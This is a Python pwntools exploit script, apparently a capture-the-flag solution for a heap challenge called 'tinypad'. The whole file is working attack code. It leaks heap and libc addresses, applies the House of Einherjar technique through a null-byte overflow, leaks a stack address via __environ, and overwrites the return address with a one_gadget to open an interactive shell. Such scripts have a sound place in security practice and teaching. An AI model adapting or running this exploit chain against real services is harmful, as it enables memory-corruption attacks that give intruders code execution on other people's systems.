from pwn import *

io = remote('127.0.0.1', 10001)		# io = process('./tinypad')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

tinypad = 0x602040

def add(size, content):
	io.sendlineafter("(CMD)>>> ", 'A')
	io.sendlineafter("(SIZE)>>> ", str(size))
	io.sendlineafter("(CONTENT)>>> ", content)

def delete(idx):
	io.sendlineafter("(CMD)>>> ", 'D')
	io.sendlineafter("(INDEX)>>> ", str(idx))

def edit(idx, content):
	io.sendlineafter("(CMD)>>> ", 'E')
	io.sendlineafter("(INDEX)>>> ", str(idx))
	io.sendlineafter("(CONTENT)>>> ", content)
	io.sendlineafter("(Y/n)>>> ", 'Y')

def leak_heap_libc():
	global heap_base, libc_base

	add(0xe0, "A" * 0x10)
	add(0xf0, "A" * 0xf0)
	add(0x100, "A" * 0x10)
	add(0x100, "A" * 0x10)

	delete(3)
	delete(1)

	io.recvuntil("INDEX: 1\n # CONTENT: ")
	heap_base = u64(io.recvn(4).ljust(8, "\x00")) - (0x100 + 0xf0)
	log.info("heap base: 0x%x" % heap_base)

	io.recvuntil("INDEX: 3\n # CONTENT: ")
	libc_base = u64(io.recvn(6).ljust(8, "\x00")) - 0x3c4b78
	log.info("libc base: 0x%x" % libc_base)

def house_of_einherjar():
	delete(4)								# move top chunk

	fake_chunk1  = "A" * 0xe0
	fake_chunk1 += p64(heap_base + 0xf0 - tinypad)	# prev_size
	add(0xe8, fake_chunk1)					# null byte overflow

	fake_chunk2  = p64(0x100)						# prev_size
	fake_chunk2 += p64(heap_base + 0xf0 - tinypad)	# size
	fake_chunk2 += p64(0x602040) * 4				# fd, bk
	edit(2, fake_chunk2)

	delete(2)								# consolidate

def leak_stack():
	global stack_addr

	environ_addr = libc_base + libc.symbols["__environ"]
	payload  = p64(0xe8) + p64(environ_addr)		# tinypad1
	payload += p64(0xe8) + p64(tinypad + 0x108)	# tinypad2
	add(0xe0, "A" * 0xe0)
	add(0xe0, payload)

	io.recvuntil("INDEX: 1\n # CONTENT: ")
	stack_addr = u64(io.recvn(6).ljust(8, "\x00"))
	log.info("stack address: 0x%x" % stack_addr)

def pwn():
	one_gadget = libc_base + 0x45216

	edit(2, p64(stack_addr - 0xf0))			# return address
	edit(1, p64(one_gadget))

	io.sendlineafter("(CMD)>>> ", 'Q')
	io.interactive()

leak_heap_libc()
house_of_einherjar()
leak_stack()
pwn()
